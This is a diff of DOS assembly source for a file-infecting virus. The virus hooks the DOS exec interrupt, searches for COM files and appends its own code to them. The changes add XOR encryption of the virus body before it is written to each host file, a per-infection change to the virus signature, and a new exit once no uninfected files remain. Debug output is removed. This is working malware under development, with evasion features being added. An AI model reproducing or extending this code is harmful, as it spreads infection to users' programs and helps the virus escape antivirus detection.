@@ -162,7 +162,11 @@ mov bx, word ptr[bp+wHostFileHandle]
 lea dx, bp+START
 mov cx, offset END_OF_CODE-offset START; number of bytes to write, a zero value truncates/extends
 ; the file to the current file position
-;-------------------testing---------------
+;-------------------encryption---------------
+SaveRegisters
+lea si,bp+EnDe
+call Printf
+RestoreRegisters
 call encrypt;encrypt virus file
 mov ah,40h ;append virus code(write it !!)
 int 21h
@@ -237,9 +241,6 @@ GetRelocation bp
 cmp word ptr[bp+counter],0000h
 je FINDFIRSTFILE
 dec  word ptr [bp+counter]
-;mov dl,'d' 
-;mov ah,2h
-;int 21h
 RestoreRegisters
 push word ptr [cs:dwOldExecISR + 2] ; segment
 push word ptr [cs:dwOldExecISR]     ; offset
@@ -261,7 +262,7 @@ mov cx,3Fh      ; attribute mask - all files
 lea dx,bp+MASKE_COM  ; DS:DX points ASCIZ filename
 mov ah,4Eh      ; function 4Eh - find first file
 int 21h         ; call DOS service
-jc  QUIT  ; If none found then return
+jc  baybay  ; If none found then return
 call Printfilename
 call InfectFile
 eraseDTA
@@ -272,7 +273,7 @@ mov cx,3Fh      ; attribute mask - all files
 lea dx,bp+MASKE_COM  ; DS:DX points ASCIZ filename
 mov ah,4Fh    ; function 4Eh - find first file
 int 21h         ; call DOS service
-jc QUIT  ; If none found then return
+jc baybay  ; If none found then return
 call Printfilename
 call InfectFile
 eraseDTA
@@ -282,14 +283,27 @@ push word ptr [cs:dwOldExecISR + 2] ; segment
 push word ptr [cs:dwOldExecISR]     ; offset
 sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
 iret
+baybay:
+mov ah,4Ch
+int 021h ;terminate program (com files) no longer files to infected 
+push word ptr [cs:dwOldExecISR + 2] ; segment
+push word ptr [cs:dwOldExecISR]     ; offset
+sti;Set interrupt flag; external, maskable interrupts enabled at the end of the next instruction.
+iret
 NewDosISR ENDP
 
-
+;----------------------------------------------------------------------------
+; Encrypt
+;----------------------------------------------------------------------------
+; Description: Encrypts or decrypt the virus code
+; Arguments: <none>
+; Registers Destroyed: cx , si ,di ,ax
 
 Encrypt PROC
-;encrypt_val    dw     3200h 
+;ret ;no Encrypt at all 
+encrypt_val dw 3200h
      push     cx
-     mov      cx,offset  virus_code+184 ;virus_size are 184
+     mov      cx,offset  virus_code+184 ;virus_size are 185
      mov      si,offset virus_code     ;start encryption at data
      mov      di,si
      cld
@@ -297,16 +311,19 @@ Encrypt PROC
 xor_loop:
 
      lodsw
-     xor      ax,3200h           ;3200h is encryption key
+     xor      ax,encrypt_val         ;3200h is encryption key
      stosw
      dec      cx
      jcxz     stoppa
      jmp      xor_loop
 
 stoppa:
-
+     mov    cx, word ptr[bp+VirusSignature]
+     add    cx,3h 
+     mov    word ptr[bp+VirusSignature] , cx; random Virus Signature
      pop      cx
      ret
 
 Encrypt ENDP
+
 
